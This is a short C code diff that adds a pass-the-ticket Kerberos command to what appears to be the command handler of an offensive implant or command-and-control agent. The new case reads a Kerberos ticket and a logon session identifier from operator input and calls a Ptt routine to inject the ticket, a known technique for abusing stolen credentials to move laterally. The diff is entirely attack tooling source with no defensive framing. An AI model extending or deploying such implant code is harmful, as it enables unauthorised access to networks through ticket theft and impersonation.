@@ -2974,6 +2974,21 @@ VOID Commandkerberos( PPARSER Parser )
             break;
         }
 
+        case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")
+        {
+            PBYTE  Ticket     = NULL;
+            UINT32 TicketSize = 0;
+            LUID   luid       = (LUID){.HighPart = 0, .LowPart = 0};
+
+            Ticket = ParserGetBytes( Parser, &TicketSize );
+
+            luid.LowPart = ParserGetInt32( Parser );
+
+            PackageAddInt32( Package, Ptt( hToken, Ticket, TicketSize, luid ) ? TRUE : FALSE );
+
+            break;
+        }
+
         default: break;
     }
 
